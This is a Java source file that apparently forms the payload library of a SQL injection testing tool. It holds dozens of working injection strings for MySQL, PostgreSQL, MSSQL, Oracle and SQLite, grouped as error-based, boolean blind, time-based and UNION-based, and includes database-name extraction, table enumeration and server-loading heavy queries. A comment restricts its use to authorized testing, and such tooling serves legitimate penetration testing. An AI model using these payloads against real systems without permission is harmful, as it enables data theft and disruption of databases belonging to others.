package com.security.sqli.payloads;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;

/**
 * Central library for SQL injection payloads.
 *
 * SECURITY NOTICE: This library contains offensive security payloads.
 * Use ONLY for authorized security testing on systems you own or have
 * explicit written permission to test.
 */
public class PayloadLibrary {
    private static final Logger logger = LoggerFactory.getLogger(PayloadLibrary.class);

    private final List<Payload> payloads;

    public PayloadLibrary() {
        this.payloads = new ArrayList<>();
        initializePayloads();
    }

    private void initializePayloads() {
        logger.info("Initializing SQL injection payload library");

        // Error-based payloads - Universal
        addErrorBasedPayloads();

        // Boolean-based blind payloads
        addBooleanBlindPayloads();

        // Time-based blind payloads
        addTimeBasedPayloads();

        // Union-based payloads
        addUnionBasedPayloads();

        logger.info("Loaded {} payloads", payloads.size());
    }

    private void addErrorBasedPayloads() {
        // Basic syntax errors - work on all databases
        payloads.add(new Payload("'", "Single quote", Payload.PayloadType.ERROR_BASED, "all", 1));
        payloads.add(new Payload("''", "Double single quote", Payload.PayloadType.ERROR_BASED, "all", 1));
        payloads.add(new Payload("\"", "Double quote", Payload.PayloadType.ERROR_BASED, "all", 1));
        payloads.add(new Payload("\"\"", "Double double quote", Payload.PayloadType.ERROR_BASED, "all", 1));
        payloads.add(new Payload("`", "Backtick", Payload.PayloadType.ERROR_BASED, "mysql", 1));
        payloads.add(new Payload("``", "Double backtick", Payload.PayloadType.ERROR_BASED, "mysql", 1));

        // MySQL specific error-based
        payloads.add(new Payload("' OR '1", "MySQL error trigger", Payload.PayloadType.ERROR_BASED, "mysql", 1));
        payloads.add(new Payload("' AND '1'='2", "MySQL boolean false", Payload.PayloadType.ERROR_BASED, "mysql", 1));
        payloads.add(new Payload("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))", "MySQL EXTRACTVALUE", Payload.PayloadType.ERROR_BASED, "mysql", 2));
        payloads.add(new Payload("' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)", "MySQL UPDATEXML", Payload.PayloadType.ERROR_BASED, "mysql", 2));
        payloads.add(new Payload("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)--", "MySQL double query", Payload.PayloadType.ERROR_BASED, "mysql", 2));

        // PostgreSQL specific error-based
        payloads.add(new Payload("' AND 1=CAST('x' AS INTEGER)--", "PostgreSQL type cast error", Payload.PayloadType.ERROR_BASED, "postgres", 2));
        payloads.add(new Payload("' AND 1=PG_SLEEP(0)--", "PostgreSQL function test", Payload.PayloadType.ERROR_BASED, "postgres", 1));

        // MSSQL specific error-based
        payloads.add(new Payload("' AND 1=CONVERT(INT,'x')--", "MSSQL type conversion error", Payload.PayloadType.ERROR_BASED, "mssql", 2));
        payloads.add(new Payload("' AND 1=(SELECT @@version)--", "MSSQL version query", Payload.PayloadType.ERROR_BASED, "mssql", 1));

        // Oracle specific error-based
        payloads.add(new Payload("' AND 1=UTL_INADDR.GET_HOST_NAME('x')--", "Oracle UTL_INADDR", Payload.PayloadType.ERROR_BASED, "oracle", 2));
        payloads.add(new Payload("' AND 1=(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)--", "Oracle version query", Payload.PayloadType.ERROR_BASED, "oracle", 1));

        // SQLite specific error-based
        payloads.add(new Payload("' AND 1=SQLITE_VERSION()--", "SQLite version", Payload.PayloadType.ERROR_BASED, "sqlite", 1));
    }

    private void addBooleanBlindPayloads() {
        // Universal boolean-based
        payloads.add(new Payload("' AND '1'='1", "Always true condition", Payload.PayloadType.BOOLEAN_BLIND, "all", 1));
        payloads.add(new Payload("' AND '1'='2", "Always false condition", Payload.PayloadType.BOOLEAN_BLIND, "all", 1));
        payloads.add(new Payload("' AND 1=1--", "Numeric true", Payload.PayloadType.BOOLEAN_BLIND, "all", 1));
        payloads.add(new Payload("' AND 1=2--", "Numeric false", Payload.PayloadType.BOOLEAN_BLIND, "all", 1));

        // MySQL boolean-based
        payloads.add(new Payload("' AND SUBSTRING(VERSION(),1,1)='5'--", "MySQL version check true", Payload.PayloadType.BOOLEAN_BLIND, "mysql", 1));
        payloads.add(new Payload("' AND SUBSTRING(VERSION(),1,1)='9'--", "MySQL version check false", Payload.PayloadType.BOOLEAN_BLIND, "mysql", 1));
        payloads.add(new Payload("' AND ASCII(SUBSTRING(DATABASE(),1,1))>64--", "MySQL database name extraction", Payload.PayloadType.BOOLEAN_BLIND, "mysql", 2));

        // PostgreSQL boolean-based
        payloads.add(new Payload("' AND SUBSTRING(VERSION(),1,1)='P'--", "PostgreSQL version check", Payload.PayloadType.BOOLEAN_BLIND, "postgres", 1));
        payloads.add(new Payload("' AND ASCII(SUBSTRING(CURRENT_DATABASE(),1,1))>64--", "PostgreSQL DB extraction", Payload.PayloadType.BOOLEAN_BLIND, "postgres", 2));

        // MSSQL boolean-based
        payloads.add(new Payload("' AND SUBSTRING(@@VERSION,1,1)='M'--", "MSSQL version check", Payload.PayloadType.BOOLEAN_BLIND, "mssql", 1));
        payloads.add(new Payload("' AND ASCII(SUBSTRING(DB_NAME(),1,1))>64--", "MSSQL DB extraction", Payload.PayloadType.BOOLEAN_BLIND, "mssql", 2));
    }

    private void addTimeBasedPayloads() {
        // MySQL time-based
        payloads.add(new Payload("' AND SLEEP(5)--", "MySQL sleep 5 seconds", Payload.PayloadType.TIME_BLIND, "mysql", 1));
        payloads.add(new Payload("' AND SLEEP(0)--", "MySQL sleep 0 seconds", Payload.PayloadType.TIME_BLIND, "mysql", 1));
        payloads.add(new Payload("' AND SLEEP(3)--", "MySQL sleep 3 seconds", Payload.PayloadType.TIME_BLIND, "mysql", 1));
        payloads.add(new Payload("' AND BENCHMARK(10000000,MD5('A'))--", "MySQL BENCHMARK", Payload.PayloadType.TIME_BLIND, "mysql", 2));
        payloads.add(new Payload("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "MySQL subquery sleep", Payload.PayloadType.TIME_BLIND, "mysql", 1));

        // PostgreSQL time-based
        payloads.add(new Payload("'; SELECT PG_SLEEP(5)--", "PostgreSQL sleep 5 seconds", Payload.PayloadType.TIME_BLIND, "postgres", 1));
        payloads.add(new Payload("'; SELECT PG_SLEEP(0)--", "PostgreSQL sleep 0 seconds", Payload.PayloadType.TIME_BLIND, "postgres", 1));
        payloads.add(new Payload("' AND (SELECT 1 FROM PG_SLEEP(5))--", "PostgreSQL sleep subquery", Payload.PayloadType.TIME_BLIND, "postgres", 1));

        // MSSQL time-based
        payloads.add(new Payload("'; WAITFOR DELAY '00:00:05'--", "MSSQL wait 5 seconds", Payload.PayloadType.TIME_BLIND, "mssql", 1));
        payloads.add(new Payload("'; WAITFOR DELAY '00:00:00'--", "MSSQL wait 0 seconds", Payload.PayloadType.TIME_BLIND, "mssql", 1));
        payloads.add(new Payload("' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5)--", "MSSQL heavy query", Payload.PayloadType.TIME_BLIND, "mssql", 2));

        // Oracle time-based
        payloads.add(new Payload("' AND DBMS_LOCK.SLEEP(5)--", "Oracle sleep 5 seconds", Payload.PayloadType.TIME_BLIND, "oracle", 1));
        payloads.add(new Payload("' AND DBMS_LOCK.SLEEP(0)--", "Oracle sleep 0 seconds", Payload.PayloadType.TIME_BLIND, "oracle", 1));

        // SQLite time-based (limited support)
        payloads.add(new Payload("' AND RANDOMBLOB(100000000)--", "SQLite heavy operation", Payload.PayloadType.TIME_BLIND, "sqlite", 2));
    }

    private void addUnionBasedPayloads() {
        // Universal UNION payloads for column detection
        payloads.add(new Payload("' UNION SELECT NULL--", "Union 1 column", Payload.PayloadType.UNION_BASED, "all", 1));
        payloads.add(new Payload("' UNION SELECT NULL,NULL--", "Union 2 columns", Payload.PayloadType.UNION_BASED, "all", 1));
        payloads.add(new Payload("' UNION SELECT NULL,NULL,NULL--", "Union 3 columns", Payload.PayloadType.UNION_BASED, "all", 1));
        payloads.add(new Payload("' UNION SELECT NULL,NULL,NULL,NULL--", "Union 4 columns", Payload.PayloadType.UNION_BASED, "all", 1));
        payloads.add(new Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "Union 5 columns", Payload.PayloadType.UNION_BASED, "all", 1));

        // MySQL UNION-based
        payloads.add(new Payload("' UNION ALL SELECT 1,2,3--", "MySQL union 3 columns", Payload.PayloadType.UNION_BASED, "mysql", 1));
        payloads.add(new Payload("' UNION ALL SELECT VERSION(),DATABASE(),USER()--", "MySQL union info extraction", Payload.PayloadType.UNION_BASED, "mysql", 2));
        payloads.add(new Payload("' UNION ALL SELECT table_name,NULL,NULL FROM information_schema.tables--", "MySQL table enumeration", Payload.PayloadType.UNION_BASED, "mysql", 2));

        // PostgreSQL UNION-based
        payloads.add(new Payload("' UNION ALL SELECT VERSION(),CURRENT_DATABASE(),CURRENT_USER--", "PostgreSQL union info", Payload.PayloadType.UNION_BASED, "postgres", 2));

        // MSSQL UNION-based
        payloads.add(new Payload("' UNION ALL SELECT @@VERSION,DB_NAME(),USER_NAME()--", "MSSQL union info", Payload.PayloadType.UNION_BASED, "mssql", 2));
    }

    /**
     * Get payloads by type.
     */
    public List<Payload> getPayloadsByType(Payload.PayloadType type) {
        return payloads.stream()
                .filter(p -> p.getType() == type)
                .collect(Collectors.toList());
    }

    /**
     * Get payloads by database type.
     */
    public List<Payload> getPayloadsByDatabase(String databaseType) {
        return payloads.stream()
                .filter(p -> p.getDatabaseType().equals("all") || p.getDatabaseType().equalsIgnoreCase(databaseType))
                .collect(Collectors.toList());
    }

    /**
     * Get payloads by type and database.
     */
    public List<Payload> getPayloads(Payload.PayloadType type, String databaseType) {
        return payloads.stream()
                .filter(p -> p.getType() == type)
                .filter(p -> p.getDatabaseType().equals("all") || p.getDatabaseType().equalsIgnoreCase(databaseType))
                .collect(Collectors.toList());
    }

    /**
     * Get safe payloads only (risk level 1-2).
     */
    public List<Payload> getSafePayloads(Payload.PayloadType type) {
        return payloads.stream()
                .filter(p -> p.getType() == type)
                .filter(p -> p.getRisk() <= 2)
                .collect(Collectors.toList());
    }

    /**
     * Get all payloads.
     */
    public List<Payload> getAllPayloads() {
        return new ArrayList<>(payloads);
    }
}
